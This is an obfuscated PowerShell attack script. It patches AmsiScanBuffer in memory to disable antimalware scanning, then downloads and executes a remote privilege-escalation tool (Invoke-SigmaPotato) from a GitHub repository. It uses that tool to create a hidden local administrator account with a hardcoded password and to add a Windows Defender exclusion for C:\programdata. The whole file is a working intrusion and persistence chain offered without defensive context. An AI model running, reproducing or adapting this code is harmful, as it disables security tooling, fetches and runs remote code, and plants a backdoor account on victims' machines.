#Rasta-mouses Amsi-Scan-Buffer patch \n
$_50m7k75fH_Qt = @"
using System;
using System.Runtime.InteropServices;
public class _50m7k75fH_Qt {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr dmfOCTXq202wZHCR, string uMD2QQ);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr QgGZX7qoxGRyZT, UIntPtr NThbwCkkx7Uz9_kdiI, uint wOsVGGBEILa, out uint bhmXnZ);
}
"@

Add-Type $_50m7k75fH_Qt

$bAK6q1DFFQtbHtVRYb0d = [_50m7k75fH_Qt]::LoadLibrary("$(('ãm'+'sî'+'.d'+'ll').nORmALIZe([CHaR]([BYTE]0x46)+[chAr]([bYte]0x6f)+[CHAr](114*5/5)+[ChAR](83+26)+[cHar](68+9-9)) -replace [ChAr](92*22/22)+[chAR](34+78)+[chAr](67+56)+[chaR]([byte]0x4d)+[ChAR](108+2)+[ChAr](125+12-12))")
$amnjkHUnKd_v8Cs = [_50m7k75fH_Qt]::GetProcAddress($bAK6q1DFFQtbHtVRYb0d, "$(('ÃmsìScánBùf'+'fèr').nOrMALIze([cHAR]([byTE]0x46)+[chaR](111+10-10)+[chaR](114*12/12)+[CHAR]([BytE]0x6d)+[cHAr]([bytE]0x44)) -replace [ChAR]([bYTE]0x5c)+[char]([bYTe]0x70)+[CHaR](4+119)+[chAR](75+2)+[ChAR]([BYTe]0x6e)+[char]([ByTE]0x7d))")
$p = 0
[_50m7k75fH_Qt]::VirtualProtect($amnjkHUnKd_v8Cs, [uint32]5, 0x40, [ref]$p)
$jnAVTFeNtCt21b27wpS = "0xB8"
$vXr = "0x57"
$Z4O3zz7GVQ = "0x00"
$noG = "0x07"
$LxL7mzXEWzwMWO3N0Z1y = "0x80"
$q7BNZ1iZ = "0xC3"
$BpoX9JQrdMpB53 = [Byte[]] ($jnAVTFeNtCt21b27wpS,$vXr,$Z4O3zz7GVQ,$noG,+$LxL7mzXEWzwMWO3N0Z1y,+$q7BNZ1iZ)
[System.Runtime.InteropServices.Marshal]::Copy($BpoX9JQrdMpB53, 0, $amnjkHUnKd_v8Cs, 6)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"















